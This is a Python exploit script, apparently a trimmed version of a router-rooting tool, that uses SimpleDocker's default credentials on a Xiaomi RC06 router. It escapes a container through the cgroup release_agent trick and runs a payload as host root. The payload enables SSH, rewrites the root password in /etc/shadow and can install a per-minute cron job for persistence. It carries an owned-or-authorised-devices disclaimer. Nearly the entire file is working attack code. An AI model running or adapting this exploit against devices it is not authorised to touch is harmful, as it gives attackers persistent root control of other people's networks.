#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
connect8 独立精简版 —— 只做「SimpleDocker 容器逃逸 -> 开 SSH」这一件事。

基于 h8suga/xmir-patcher 的 connect8.py (feat/simpledocker-cgroup-escape)，
去掉了 gateway/xmir_base 依赖和 post_connect() 的额外改动，便于审计。

仅用于你自己拥有或已获明确授权的设备。详见仓库 README。

用法:
  python connect8_standalone.py <web管理密码> \
      --host <路由器IP> --password <新root密码> [--persist]

可选参数:
  --host         路由器 IP（默认 192.168.1.1，请按实际改）
  --docker-port  SimpleDocker 端口（默认 9001）
  --docker-user  SimpleDocker 账号（默认 admin）
  --docker-pass  SimpleDocker 密码（默认 admin）
  --password     要设置的 SSH root 密码（默认 root，建议改掉）
  --salt         md5crypt 盐（默认随机 8 位；如需配合持久化脚本可固定）
  --persist      写开机持久化脚本（注意：BusyBox @reboot 可能无效，见 docs/03）

前提（需在路由器后台手动完成）:
  1. 插 ext4 U 盘，后台确认识别为外接存储
  2. 后台安装 Docker / SimpleDocker，浏览器能打开 http://<路由器IP>:9001
  3. SimpleDocker 默认账号 admin/admin（如改过，用 --docker-user/--docker-pass）

依赖:
  pip install -r requirements.txt
  openssl（本机需可用，用于生成 md5crypt hash；本机已验证）
"""
import sys
import re
import time
import random
import string
import threading
import subprocess
import argparse

import requests
import websocket


def die(msg):
    print('\n[x] ' + msg)
    sys.exit(1)


def md5crypt(pw, salt):
    """用本机 openssl 生成 md5crypt hash —— 必须正确，否则 SSH 登不进去。"""
    try:
        h = subprocess.check_output(
            ['openssl', 'passwd', '-1', '-salt', salt, pw],
            stderr=subprocess.DEVNULL, timeout=5).decode().strip()
        if h.startswith('$1$'):
            return h
    except FileNotFoundError:
        die('找不到 openssl。请安装 openssl 后重试（不要用无法验证的纯 Python hash，会把你锁在 SSH 外面）。')
    except Exception as e:
        die(f'生成密码 hash 失败（openssl passwd -1）: {e}')
    die('openssl 返回的 hash 格式不对，已停止以避免写错密码。')


def parse_args():
    p = argparse.ArgumentParser(description='connect8 standalone: Xiaomi RC06 SimpleDocker cgroup escape -> SSH')
    p.add_argument('web_password',
                   help='路由器 Web 后台密码（兼容原版参数；SimpleDocker 实际用 --docker-user/--docker-pass 独立登录）')
    p.add_argument('--host', default='192.168.1.1', help='路由器 IP（默认 192.168.1.1）')
    p.add_argument('--docker-port', type=int, default=9001, help='SimpleDocker 端口（默认 9001）')
    p.add_argument('--docker-user', default='admin', help='SimpleDocker 账号（默认 admin）')
    p.add_argument('--docker-pass', default='admin', help='SimpleDocker 密码（默认 admin）')
    p.add_argument('--password', default='root', help='SSH root 密码（默认 root，建议改掉）')
    p.add_argument('--salt', default=None, help='md5crypt 盐（默认随机 8 位）')
    p.add_argument('--persist', action='store_true', help='写开机持久化脚本')
    return p.parse_args()


def clean(raw):
    if isinstance(raw, bytes):
        raw = raw.decode('utf-8', errors='replace')
    raw = re.sub(r'\x1b\[[0-9;?]*[mGKHJlhABCDEFGsu]', '', raw)
    return re.sub(r'\[6n', '', raw).replace('\r', '')


def ws_exec(ws_url, commands, wait=4.0):
    buf = []

    def on_msg(_, msg):
        buf.append(clean(msg))

    def on_open(ws):
        def run():
            time.sleep(0.6)
            ws.send(b'stty cols 220\n')
            time.sleep(0.3)
            for delay, cmd in commands:
                if delay > 0:
                    time.sleep(delay)
                ws.send((cmd.encode() if isinstance(cmd, str) else cmd) + b'\n')
            time.sleep(wait)
            ws.close()
        threading.Thread(target=run, daemon=True).start()

    websocket.WebSocketApp(ws_url, on_message=on_msg, on_open=on_open).run_forever()
    time.sleep(0.2)
    return ''.join(buf)


def main():
    a = parse_args()
    router = a.host
    base = f'http://{router}:{a.docker_port}'
    salt = a.salt or ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
    _hash = md5crypt(a.password, salt)

    print(f'[connect8-standalone] 目标 {router}')
    print(f'[connect8-standalone] root 密码将设为: {a.password}')

    # ── stage 1: SimpleDocker 可达性 ────────────────────────────────────────
    try:
        requests.get(base + '/', timeout=5)
    except requests.ConnectionError:
        die(f'{a.docker_port} 端口不通。请先插 U 盘并在后台装 Docker，确认 {base} 能打开。')
    except Exception as e:
        die(f'SimpleDocker 探测失败: {e}')

    # ── stage 2: 登录 ───────────────────────────────────────────────────────
    try:
        r = requests.post(base + '/api/system/login',
                          json={'username': a.docker_user, 'password': a.docker_pass},
                          timeout=10)
        r.raise_for_status()
        token = r.json().get('Data')
        if not token:
            raise ValueError('empty token')
    except Exception as e:
        die(f'SimpleDocker 登录失败: {e}（默认账号 {a.docker_user}/{a.docker_pass}，改过就用 --docker-user/--docker-pass）')
    auth = {'Authorization': token}
    print('[+] SimpleDocker 登录成功')

    # ── stage 2b: Docker daemon ─────────────────────────────────────────────
    def docker_ok():
        try:
            return requests.get(base + '/api/docker/info', headers=auth, timeout=5).status_code == 200
        except Exception:
            return False

    if not docker_ok():
        print('[*] Docker daemon 未响应，尝试重连...')
        try:
            requests.post(base + '/api/system/safe', headers=auth, timeout=10)
        except Exception:
            pass
        time.sleep(4)
        if not docker_ok():
            die('Docker daemon 起不来。去 SimpleDocker 页面开关一下 Docker 或重启路由器。')

    # ── stage 3: 找/起一个容器 ──────────────────────────────────────────────
    try:
        j = requests.get(base + '/api/container', headers=auth, timeout=10).json()
        containers = (j.get('Data') if isinstance(j, dict) else j) or []
    except Exception as e:
        die(f'列容器失败: {e}')

    cid = None
    for c in containers:
        st = (c.get('Status') or c.get('status') or '').lower()
        if 'up' in st or 'running' in st:
            cid = c.get('Id') or c.get('id') or ''
            if cid:
                break

    if not cid and containers:
        sid = containers[0].get('Id') or containers[0].get('id') or ''
        print(f'[*] 启动已有容器 {sid[:12]} ...')
        try:
            requests.post(base + f'/api/container/{sid}/start', headers=auth, timeout=10)
        except Exception:
            pass
        time.sleep(2)
        j = requests.get(base + '/api/container', headers=auth, timeout=10).json()
        containers = (j.get('Data') if isinstance(j, dict) else j) or []
        for c in containers:
            st = (c.get('Status') or c.get('status') or '').lower()
            if 'up' in st or 'running' in st:
                cid = c.get('Id') or c.get('id') or ''
                if cid:
                    break

    if not cid:
        print('[*] 没有运行中的容器，尝试从镜像创建一个 ...')
        try:
            ij = requests.get(base + '/api/image', headers=auth, timeout=10).json()
            images = (ij.get('Data') if isinstance(ij, dict) else ij) or []
        except Exception:
            images = []
        img = None
        for x in images:
            tag = (x.get('RepoTags') or [''])[0] if isinstance(x.get('RepoTags'), list) else (x.get('RepoTags') or '')
            if tag and tag != '<none>:<none>':
                img = tag
                break
        if not img:
            die('SimpleDocker 里没有镜像。先去 9001 页面 pull 一个 alpine，建好容器再重试。')
        try:
            resp = requests.post(base + '/api/container/run', headers=auth, timeout=20,
                                 json={'image': img, 'cmd': 'sh', 'name': 'xmir8_tmp'})
            cid = (resp.json().get('Data') or {}).get('Id') or ''
        except Exception as e:
            die(f'建容器失败: {e}')
        time.sleep(2)
        if not cid:
            die('没能自动建容器。请去 9001 页面手动建一个并启动。')

    print(f'[+] 容器 {cid[:16]}...')

    # ── stage 4: WebSocket 终端 ─────────────────────────────────────────────
    def get_exec():
        j = requests.get(base + f'/api/container/{cid}/command/exec', headers=auth, timeout=10).json()
        return j.get('Data')

    exec_id = get_exec()
    if not exec_id:
        die('拿不到 exec session')

    def ws_url(eid):
        return (f'ws://{router}:{a.docker_port}/ws/api/container/terminal/{eid}'
                f'?containerId={cid}&token={token}')

    def ws(cmds, wait=4.0):
        eid = None
        try:
            eid = get_exec()
        except Exception:
            eid = exec_id
        return ws_exec(ws_url(eid or exec_id), cmds, wait=wait)

    # ── stage 5: 找 overlay upperdir ────────────────────────────────────────
    print('[*] 探测 overlay 路径...')
    mounts = ws([(0, 'cat /proc/mounts'), (0.3, 'echo __END__')], wait=3.0)
    m = re.search(r'upperdir=([^,\) \t\n]+)', mounts)
    if not m:
        die('/proc/mounts 里没有 upperdir。Docker 存储驱动可能不是 overlay2。')
    overlay = m.group(1).rstrip('/')
    print(f'[+] overlay upperdir: {overlay}')

    PAYLOAD_NAME = 'xmir8_payload.sh'
    payload_host = f'{overlay}/tmp/{PAYLOAD_NAME}'
    log_host = f'{overlay}/tmp/{PAYLOAD_NAME}.log'

    # ── stage 6: payload ────────────────────────────────────────────────────
    # 注意：原版 --persist 用 @reboot cron，BusyBox 1.25.1 可能不支持。
    #       可靠方案见 tools/xmir_ssh_restore.sh 与 docs/03-post-root-audit.md。
    persist_block = ''
    if a.persist:
        persist_block = f"""
cat > /data/xmir_ssh_restore.sh << 'PEOF'
#!/bin/sh
# idempotent SSH restore, invoked every minute from persistent crontab
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
LOG=/data/xmir_ssh_restore.log
HASH='{_hash}'
KEY_DURABLE=/data/xmir_dropbear_rsa_host_key
KEY_LIVE=/etc/dropbear/dropbear_rsa_host_key
log() {{ echo "$(date '+%m-%d %H:%M:%S') $*" >> "$LOG"; }}
[ "$(nvram get ssh_en 2>/dev/null)" = "1" ] || {{ nvram set ssh_en=1 >/dev/null 2>&1 && nvram commit >/dev/null 2>&1; }}
mkdir -p /etc/dropbear
if [ ! -s "$KEY_LIVE" ]; then
  if [ -s "$KEY_DURABLE" ]; then cp "$KEY_DURABLE" "$KEY_LIVE" 2>/dev/null
  else /usr/bin/dropbearkey -t rsa -f "$KEY_LIVE" >/dev/null 2>&1; [ -s "$KEY_LIVE" ] && cp "$KEY_LIVE" "$KEY_DURABLE" 2>/dev/null; fi
fi
chmod 600 "$KEY_LIVE" 2>/dev/null
if grep -q '"release"' /etc/init.d/dropbear 2>/dev/null; then
  sed -i 's/ -o "$channel" = "release"//g' /etc/init.d/dropbear 2>/dev/null
fi
SHADOW=$(readlink -f /etc/shadow 2>/dev/null || echo /etc/shadow)
if ! grep -q "^root:$HASH:" "$SHADOW" 2>/dev/null; then
  {{ grep -v '^root:' "$SHADOW"; echo "root:$HASH:19000:0:99999:7:::"; }} > /tmp/_xmir_sh && mv /tmp/_xmir_sh "$SHADOW"
fi
# 不要加 -F & ：后台作业会随 cron 会话 SIGHUP 被杀；让 dropbear 自行 daemonize
if ! netstat -tlnp 2>/dev/null | grep -q ':22 '; then
  /usr/sbin/dropbear -p 22 -K 300 -T 3 >/dev/null 2>&1
  sleep 1
  netstat -tlnp 2>/dev/null | grep -q ':22 ' && log "dropbear started (daemonized)" || log "dropbear start FAILED"
fi
PEOF
chmod +x /data/xmir_ssh_restore.sh
# 用每分钟 cron 代替 @reboot（BusyBox 不一定支持），并重启 crond 让其重读
grep -q 'xmir_ssh_restore' /etc/crontabs/root 2>/dev/null || echo '* * * * * /data/xmir_ssh_restore.sh >/dev/null 2>&1' >> /etc/crontabs/root
/etc/init.d/cron restart >/dev/null 2>&1
echo "persist=1" >> "$LOG"
"""

    payload = f"""#!/bin/sh
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
LOG="{log_host}"
echo START > "$LOG"; id >> "$LOG"

nvram set ssh_en=1 && nvram commit
echo "ssh_en=$(nvram get ssh_en)" >> "$LOG"

if grep -q '"release"' /etc/init.d/dropbear 2>/dev/null; then
  sed -i 's/ -o "$channel" = "release"//g' /etc/init.d/dropbear
  echo init_patched=1 >> "$LOG"
fi

mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || /usr/bin/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key >> "$LOG" 2>&1

SHADOW_FILE=$(readlink -f /etc/shadow 2>/dev/null || echo /etc/shadow)
{{ grep -v '^root:' "$SHADOW_FILE"; echo 'root:{_hash}:19000:0:99999:7:::'; }} > /tmp/_sh && mv /tmp/_sh "$SHADOW_FILE"
grep -c '^root:.*:19000:' /etc/shadow >> "$LOG" && echo passwd=set >> "$LOG" || echo passwd=FAIL >> "$LOG"

/etc/init.d/dropbear start >> "$LOG" 2>&1
echo "dropbear_start=$?" >> "$LOG"
sleep 2
netstat -tlnp 2>/dev/null | grep ':22 ' >> "$LOG" && echo PORT22=OPEN >> "$LOG" || echo PORT22=closed >> "$LOG"
{persist_block}
echo DONE >> "$LOG"
"""

    # ── stage 7: 写 payload ─────────────────────────────────────────────────
    print('[*] 写 payload 到容器 /tmp ...')
    cmds = [(0, f"cat > /tmp/{PAYLOAD_NAME} << 'XEOF'")]
    cmds += [(0, line) for line in payload.strip().splitlines()]
    cmds += [(0, 'XEOF'), (0.2, f'chmod +x /tmp/{PAYLOAD_NAME}'),
             (0.2, f'test -x /tmp/{PAYLOAD_NAME} && echo WRITE_OK || echo WRITE_FAIL')]
    out = ws(cmds, wait=2.0)
    if 'WRITE_OK' not in out:
        die(f'payload 写入失败。容器文件系统可能只读。WS 输出:\n{out[:600]}')
    print('[+] payload 已写入')

    # ── stage 8: cgroup 逃逸 ────────────────────────────────────────────────
    print('[*] 触发 cgroup release_agent 逃逸 ...')
    CG = 'xmir8'
    CH = 'trigger'
    escape = [
        (0,   f'mkdir -p /tmp/{CG}'),
        (0.1, f'mount -t cgroup -o none,name={CG} cgroup /tmp/{CG} 2>/dev/null || true'),
        (0.2, f"echo '{payload_host}' > /tmp/{CG}/release_agent"),
        (0.1, f'mkdir -p /tmp/{CG}/{CH}'),
        (0.1, f'echo 1 > /tmp/{CG}/{CH}/notify_on_release'),
        (0.2, f"sh -c 'echo $$ > /tmp/{CG}/{CH}/cgroup.procs; sleep 0.1'"),
    ]
    ws(escape, wait=1.5)

    print('[*] 等待 payload 执行（生成 RSA key 约 3 秒）...')
    time.sleep(8)

    # ── stage 9: 读结果 ─────────────────────────────────────────────────────
    result = ws([(0.2, f'cat /tmp/{PAYLOAD_NAME}.log 2>/dev/null || echo NO_LOG')], wait=2.0)
    if 'NO_LOG' in result and 'START' not in result:
        time.sleep(4)
        result = ws([(0.2, f'cat /tmp/{PAYLOAD_NAME}.log 2>/dev/null || echo NO_LOG')], wait=2.0)

    print('\n--- payload 日志 ---')
    for line in result.splitlines():
        s = line.strip()
        if s and 'NO_LOG' not in s:
            print('  ' + s)
    print('-------------------\n')

    if 'PORT22=OPEN' not in result:
        time.sleep(3)
        check = ws([(0.2, "netstat -tlnp 2>/dev/null | grep ':22 ' && echo OPEN22 || echo CLOSED22")], wait=2.0)
        if 'OPEN22' not in check:
            die('exploit 跑了但 22 端口还是没开。看上面的日志找原因。')

    print('[✓] SSH 已在 22 端口打开！')
    print(f'[✓] 账号: root / {a.password}')
    if a.persist:
        print('[✓] 已写 /data/xmir_ssh_restore.sh + 每分钟 cron（详见 docs/03）')
    print('\n接下来验证: ')
    print(f'  ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa '
          f'-o PubkeyAcceptedAlgorithms=+ssh-rsa root@{router}')


if __name__ == '__main__':
    main()
